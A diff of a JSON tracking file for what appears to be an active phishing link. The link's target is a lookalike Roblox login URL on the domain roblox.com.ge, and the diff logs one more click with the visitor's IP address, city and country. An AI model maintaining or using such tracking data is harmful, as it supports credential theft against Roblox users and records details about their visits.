@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1051,
+    "useCount": 1052,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8528,6 +8528,14 @@
         "city": "Düsseldorf",
         "flag": "🇩🇪",
         "countryCode": "DE"
+      },
+      {
+        "timestamp": 1777237970036,
+        "ip": "129.222.163.141",
+        "country": "United States",
+        "city": "Ashburn",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
